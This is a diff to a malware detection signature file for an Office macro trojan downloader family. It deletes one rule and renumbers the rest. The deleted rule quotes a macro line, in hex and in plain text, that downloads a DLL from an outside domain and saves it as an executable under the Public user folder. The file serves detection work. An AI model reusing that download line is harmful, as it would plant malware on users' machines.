@@ -25,16 +25,6 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_2{
 }
 rule TrojanDownloader_O97M_Obfuse_SS_MTB_3{
 	meta:
-		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 "
-		
-	strings :
-		$a_01_0 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 20 30 26 2c 20 22 68 74 74 70 73 3a 2f 2f 66 69 67 65 73 6f 79 75 7a 6f 2e 63 6f 6d 2f 75 73 64 61 32 39 6b 73 61 67 68 31 32 2f 31 35 2e 64 6c 6c 22 2c 20 22 43 3a 5c 5c 55 73 65 72 73 5c 5c 50 75 62 6c 69 63 5c 5c 34 35 31 34 38 2e 65 78 65 } //1 URLDownloadToFile 0&, "https://figesoyuzo.com/usda29ksagh12/15.dll", "C:\\Users\\Public\\45148.exe
-	condition:
-		((#a_01_0  & 1)*1) >=1
- 
-}
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_4{
-	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
 		
 	strings :
@@ -45,7 +35,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_4{
 		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_03_2  & 1)*1) >=3
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_5{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_4{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
 		
@@ -56,7 +46,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_5{
 		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_6{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_5{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
 		
@@ -68,7 +58,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_6{
 		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_7{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_6{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
 		
@@ -80,7 +70,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_7{
 		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_8{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_7{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 03 00 00 "
 		
@@ -92,7 +82,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_8{
 		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=2
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_9{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_8{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
 		
@@ -103,7 +93,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_9{
 		((#a_03_0  & 1)*1+(#a_01_1  & 1)*1) >=2
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_10{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_9{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
 		
@@ -116,7 +106,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_10{
 		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1+(#a_01_2  & 1)*1+(#a_03_3  & 1)*1) >=4
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_11{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_10{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
 		
@@ -130,7 +120,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_11{
 		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_12{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_11{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
 		
@@ -142,7 +132,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_12{
 		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_13{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_12{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
 		
@@ -156,7 +146,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_13{
 		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_14{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_13{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
 		
@@ -168,7 +158,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_14{
 		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_15{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_14{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
 		
@@ -182,7 +172,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_15{
 		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_16{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_15{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 "
 		
@@ -197,7 +187,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_16{
 		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_03_2  & 1)*1+(#a_03_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=6
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_17{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_16{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
 		
@@ -210,7 +200,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_17{
 		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1+(#a_03_2  & 1)*1+(#a_03_3  & 1)*1) >=4
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_18{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_17{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 05 00 00 "
 		
@@ -224,7 +214,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_18{
 		((#a_03_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*2) >=3
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_19{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_18{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
 		
@@ -237,7 +227,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_19{
 		((#a_03_0  & 1)*1+(#a_03_1  & 1)*1+(#a_03_2  & 1)*1+(#a_03_3  & 1)*1) >=4
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_20{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_19{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 07 00 00 "
 		
@@ -253,7 +243,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_20{
 		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1+(#a_01_6  & 1)*1) >=5
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_21{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_20{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,08 00 08 00 08 00 00 "
 		
@@ -270,7 +260,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_21{
 		((#a_03_0  & 1)*1+(#a_01_1  & 1)*1+(#a_03_2  & 1)*1+(#a_03_3  & 1)*1+(#a_01_4  & 1)*1+(#a_03_5  & 1)*1+(#a_01_6  & 1)*1+(#a_01_7  & 1)*1) >=8
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_22{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_21{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
 		
@@ -283,7 +273,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_22{
 		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_23{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_22{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 "
 		
@@ -298,7 +288,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_23{
 		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_03_4  & 1)*1+(#a_03_5  & 1)*1) >=6
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_24{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_23{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 03 00 00 "
 		
@@ -310,7 +300,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_24{
 		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=1
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_25{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_24{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,08 00 08 00 08 00 00 "
 		
@@ -327,7 +317,7 @@ rule TrojanDownloader_O97M_Obfuse_SS_MTB_25{
 		((#a_03_0  & 1)*1+(#a_03_1  & 1)*1+(#a_03_2  & 1)*1+(#a_01_3  & 1)*1+(#a_03_4  & 1)*1+(#a_03_5  & 1)*1+(#a_03_6  & 1)*1+(#a_01_7  & 1)*1) >=8
  
 }
-rule TrojanDownloader_O97M_Obfuse_SS_MTB_26{
+rule TrojanDownloader_O97M_Obfuse_SS_MTB_25{
 	meta:
 		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
 		
